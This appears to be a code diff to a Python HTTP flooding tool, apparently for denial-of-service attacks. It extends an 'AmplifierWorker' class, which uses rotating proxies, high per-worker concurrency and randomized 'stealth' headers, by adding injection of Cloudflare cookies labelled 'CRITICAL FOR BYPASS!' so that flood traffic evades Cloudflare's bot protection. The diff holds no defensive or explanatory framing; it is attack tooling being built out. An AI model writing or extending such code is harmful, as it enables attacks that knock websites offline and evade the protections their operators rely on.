@@ -303,6 +303,7 @@ class AmplifierWorker:
         concurrent_per_worker: int = 150,
         request_timeout: float = 8.0,
         vector_name: str = "amplifier",
+        cf_cookies: Optional[Dict[str, str]] = None,
     ) -> None:
         self.target_url = target_url
         self.proxy_rotator = proxy_rotator
@@ -315,6 +316,7 @@ class AmplifierWorker:
         self.concurrent_per_worker = concurrent_per_worker
         self.request_timeout = request_timeout
         self.vector_name = vector_name
+        self.cf_cookies = cf_cookies or {}  # Store CF cookies for injection
 
         self.metrics = AmplifierMetrics()
         self._last_report = time.time()
@@ -425,10 +427,16 @@ class AmplifierWorker:
                     f"https://{self.host}/",
                     f"https://{self.host}/index.html",
                     "https://www.facebook.com/",
-                    "https://twitter.com/",
-                    "https://www.reddit.com/",
                 ]
                 headers["Referer"] = random.choice(referers)
+            
+            # INJECT CLOUDFLARE COOKIES - CRITICAL FOR BYPASS!
+            if self.cf_cookies:
+                cookie_str = "; ".join([f"{k}={v}" for k, v in self.cf_cookies.items()])
+                if "Cookie" in headers:
+                    headers["Cookie"] = headers["Cookie"] + "; " + cookie_str
+                else:
+                    headers["Cookie"] = cookie_str
             
             # STEALTH: Random Accept-Language
             langs = [
@@ -604,6 +612,7 @@ def run_amplifier_in_thread(
     concurrent_per_worker: int = 150,
     vector_name: str = "amplifier",
     result_dict: Optional[Dict[str, Any]] = None,
+    cf_cookies: Optional[Dict[str, str]] = None,
 ) -> None:
     """Thread entry: each worker runs in its own asyncio event loop."""
     import sys
@@ -627,6 +636,7 @@ def run_amplifier_in_thread(
         rps_factor_callable=rps_factor_callable,
         concurrent_per_worker=concurrent_per_worker,
         vector_name=vector_name,
+        cf_cookies=cf_cookies,  # Pass CF cookies to worker
     )
 
     try:
